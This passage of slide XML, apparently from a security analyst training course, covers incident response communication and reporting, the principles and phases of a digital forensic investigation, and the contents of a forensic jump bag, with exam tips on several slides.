                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Report to senior management</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677</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Elements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Beyond the sequential phases, effective incident response depends on cross-cutting elements that run continuously, chiefly communication, analysis, and reporting, which the exam treats as activities woven through the entire lifecycle rather than single steps.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Communication keeps stakeholders aligned throughout the incident, engaging the right internal teams, management, legal, HR, and external parties such as law enforcement or affected customers, and it must follow pre-defined escalation and notification paths to avoid leaks or missed regulatory deadlines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysis applies technical techniques such as log correlation, malware examination, and timeline reconstruction to understand scope and impact, while reporting captures every action, finding, and decision so the record is complete, accurate, and admissible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because poor communication and thin documentation are the most common causes of failed incident handling, breaking chain-of-custody, delaying breach notifications, and preventing the organization from learning from the event.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions often test that communication and documentation happen throughout the whole IR process, not just at the end, and that stakeholder notification follows the communication plan.</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678</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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IR Process Elements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Communication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Important throughout IR process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Get everyone involved</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Technical techniques</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Document everything</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679</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · INCIDENT RESPONSE PROCESS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Who’s Involved?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Key roles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Stakeholders</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reporting policy</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680</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Digital Forensics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Digital forensics is the disciplined collection, preservation, and analysis of digital evidence to reconstruct what happened during an incident, answering the investigative five W's of who was involved, what occurred, where it happened, when it took place, and why.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It spans several subdisciplines including computer (host and disk) forensics, network forensics that examines captured traffic and flow data, mobile forensics for smartphones and tablets, and code or malware analysis that reverse-engineers malicious software to determine its behavior and origin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Findings must be reproducible and evidentiary, meaning the analyst works from verified copies and maintains integrity so conclusions hold up to scrutiny.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts use forensics to move from simply detecting an incident to explaining it, which drives accurate scoping, attribution, remediation, and any legal or regulatory follow-up.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to match a forensic subdiscipline (network, host, mobile, malware/code) to the evidence source in a scenario and to recognize forensics as evidence-driven answering of the five W's.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681</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Digital Forensics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Collecting &amp; analyzing digital clues to figure out the 5 W’s:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Who</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Where</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  When</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Why</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682</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Digital Forensics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Network forensics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Mobile forensics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Computer forensics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Code analysis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683</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Principles of Forensics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The guiding principles of forensics center on doing no harm and preserving data integrity, meaning the examiner must avoid altering original evidence and must be able to prove that what was analyzed is identical to what was seized.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Competence matters, so forensic examiners require ongoing training and certification to meet legal requirements and regulations and to ensure their methods and testimony are credible and defensible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Sound evidence handling demands meticulous note-taking and a documented process for the collection, inspection, and storage of evidence, producing an audit trail complete enough that an independent third party could follow it and reach the same result.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts internalize these principles because a single integrity lapse, undocumented step, or use of an untrained handler can render evidence inadmissible and collapse an otherwise strong case.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions testing evidence integrity, repeatability, and the need for a defensible audit trail, where the correct answer preserves the original and documents every action.</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684</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Principles of Forensics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Do no harm</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Don’t affect data integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Train, train, train</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Forensic examiners &amp; professionals</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Requirements &amp; regulations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Provide evidence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Keep good notes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Collection, inspection, storage of evidence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Audit trail for 3rd party inspection</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685</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Phases of a Forensic Investigation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A forensic investigation proceeds through distinct phases: seizure, acquisition, analysis, and reporting, each building on the integrity of the last.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Seizure secures the evidence and the scene so data cannot be tampered with, and acquisition then extracts the data by creating a verified forensic image, with the examiner always working from that image rather than the original source to avoid contaminating it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysis makes sense of the acquired data by carving files, examining artifacts, correlating timelines, and testing hypotheses about the incident, and reporting communicates the findings in a form matched to the audience, whether that is technical peers, management, or a court.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts follow this structure so evidence stays sound from collection through courtroom, and so the final report is understandable and actionable for whoever must act on it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect ordering questions and the key rule that analysis is performed on a forensic image, not the original, and that reporting must be tailored to the audience.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686</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Phases of a Forensic Investigation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Seizure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ensure data isn’t tampered with</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Acquisitions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Extracting data from the scene</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Work from forensic image</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make sense of the data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Know your audience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687</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Your Forensic Tool Kit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A forensic toolkit, often assembled as a portable jump bag, is the pre-staged set of hardware and software an analyst grabs to respond to an incident on short notice so no time is lost gathering gear.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Typical contents include a laptop with pre-installed forensic software, clean hard drives for imaging and storage, a USB hub, an assortment of cables and adapters, an external hard drive enclosure, and a basic hand-tool kit for opening devices.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It also holds documentation and scene-control items such as a camera to photograph the scene, crime-scene tape and tamper-evident seals, and in wireless investigations a spectrum analyzer to identify rogue signals.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Having a ready jump bag lets the SOC respond quickly and consistently while ensuring evidence is captured to clean, controlled media that preserves integrity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may ask which tool from a jump bag fits a task, so associate items like write blockers, clean media, cameras, and seals with their evidence-preservation purpose.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688</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Your Forensic Tool Kit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Jump bag</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Laptop with pre-installed forensic software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Hard drives for storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  USB hub</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Cables &amp; adapters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Hard drive enclosure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Toolkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Camera</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Wireless spectrum analyzer</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689</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · DIGITAL FORENSICS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Your Forensic Tool Kit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Crime scene tape &amp; seals</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
